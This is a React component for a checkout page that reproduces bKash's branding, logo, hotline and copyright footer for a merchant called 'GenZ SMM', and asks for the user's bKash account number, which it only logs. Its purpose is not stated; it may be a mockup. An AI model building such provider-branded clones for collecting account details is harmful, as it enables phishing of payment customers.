import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Phone } from "lucide-react";
import genzLogo from "@/assets/genz-logo.png";

const BkashPayment = () => {
  const navigate = useNavigate();
  const [phoneNumber, setPhoneNumber] = useState("");
  
  // Valid BD prefixes: 013, 014, 015, 016, 017, 018, 019
  const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
  
  const isValidNumber = () => {
    if (phoneNumber.length !== 11) return false;
    const prefix = phoneNumber.substring(0, 3);
    return validPrefixes.includes(prefix) && /^\d+$/.test(phoneNumber);
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 11);
    setPhoneNumber(value);
  };

  const handleConfirm = () => {
    if (isValidNumber()) {
      // Handle payment confirmation
      console.log("Proceeding with number:", phoneNumber);
    }
  };

  return (
    <div className="min-h-screen bg-gray-200 flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">
        {/* bKash Logo Header */}
        <div className="bg-white py-4 flex justify-center border-b">
          <div className="flex items-center gap-1">
            <span className="text-[#E2136E] text-2xl font-medium">বিকাশ</span>
            <svg width="40" height="40" viewBox="0 0 50 50" fill="none">
              <path d="M25 5L15 25L25 20L35 25L25 5Z" fill="#E2136E"/>
              <path d="M25 20L15 25L20 35L25 30L30 35L35 25L25 20Z" fill="#D11B60"/>
              <path d="M20 35L25 45L30 35L25 30L20 35Z" fill="#E2136E"/>
            </svg>
          </div>
        </div>

        {/* Merchant Info */}
        <div className="bg-white px-4 py-3 flex items-center justify-between border-b">
          <div className="flex items-center gap-3">
            <img 
              src={genzLogo} 
              alt="GenZ SMM" 
              className="w-12 h-12 rounded-full object-cover"
            />
            <div>
              <h2 className="text-gray-800 font-semibold text-sm leading-tight">
                GenZ SMM
              </h2>
              <p className="text-gray-500 text-xs">
                Inv No: B255527202718B
              </p>
            </div>
          </div>
          <span className="text-gray-800 font-bold text-lg">৳434</span>
        </div>

        {/* Pink Section */}
        <div className="bg-[#E2136E] px-6 py-12">
          <h3 className="text-white text-center text-lg font-medium mb-6">
            Your bKash Account Number
          </h3>
          <input
            type="tel"
            value={phoneNumber}
            onChange={handlePhoneChange}
            placeholder="e.g 01XXXXXXXXX"
            className="w-full bg-white rounded-md px-4 py-3 text-center text-gray-600 text-lg placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-white/50"
          />
          <p className="text-white text-center text-sm mt-4">
            Confirm and proceed,{" "}
            <a href="#" className="underline hover:text-white/80">
              terms & conditions
            </a>
          </p>
        </div>

        {/* Action Buttons */}
        <div className="bg-white px-4 py-4 flex gap-3">
          <button
            onClick={() => navigate("/")}
            className="flex-1 bg-white border border-gray-300 text-gray-700 py-3 rounded-md font-medium hover:bg-gray-50 transition-colors"
          >
            Cancel
          </button>
          <button
            onClick={handleConfirm}
            disabled={!isValidNumber()}
            className={`flex-1 py-3 rounded-md font-medium transition-colors ${
              isValidNumber()
                ? "bg-[#E2136E] text-white hover:bg-[#C91160]"
                : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
          >
            Confirm
          </button>
        </div>

        {/* Footer */}
        <div className="bg-white px-4 py-3 text-center border-t">
          <div className="flex items-center justify-center gap-1 text-[#E2136E] mb-1">
            <Phone className="w-4 h-4" />
            <span className="font-medium">16247</span>
          </div>
          <p className="text-gray-500 text-xs">
            © 2025 bKash, All Rights Reserved
          </p>
        </div>
      </div>
    </div>
  );
};

export default BkashPayment;
